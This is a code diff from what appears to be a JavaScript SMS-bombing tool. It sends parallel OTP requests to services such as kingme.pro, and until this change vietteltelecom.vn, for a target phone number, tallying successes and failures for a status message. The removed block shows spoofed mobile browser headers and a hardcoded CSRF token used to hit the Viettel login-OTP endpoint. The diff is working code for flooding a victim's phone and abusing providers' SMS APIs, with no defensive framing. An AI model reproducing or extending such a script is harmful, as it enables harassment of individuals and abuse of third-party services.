@@ -188,21 +188,6 @@ const kingMeData = {
   msisdn: phone,
 };
 
-    const viettelHeaders = {
-      'Host': 'vietteltelecom.vn',
-      'Connection': 'keep-alive',
-      'X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I',
-      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
-      'Content-Type': 'application/json;charset=UTF-8',
-      'Accept': 'application/json, text/plain, */*',
-      'Referer': 'https://vietteltelecom.vn/dang-nhap',
-    };
-    
-    const viettelData = {
-      phone: phone,
-      type: ''
-    };
-
 
     // Initial message to be edited later
     let messageID = null;
@@ -245,16 +230,14 @@ const kingMeData = {
           headers: kavayHeaders,
           cookies: kavayCookies
         }), 
-        axios.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', kingMeData, { headers: kingMeHeaders }), 
-        axios.post('https://vietteltelecom.vn/api/get-otp-login', viettelData, { headers: viettelHeaders })
-
+        axios.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', kingMeData, { headers: kingMeHeaders })
       ])
       .then(() => {
-        successCount += 8;
+        successCount += 7;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 8;
+        failureCount += 7;
         updateMessage();
       });
     };
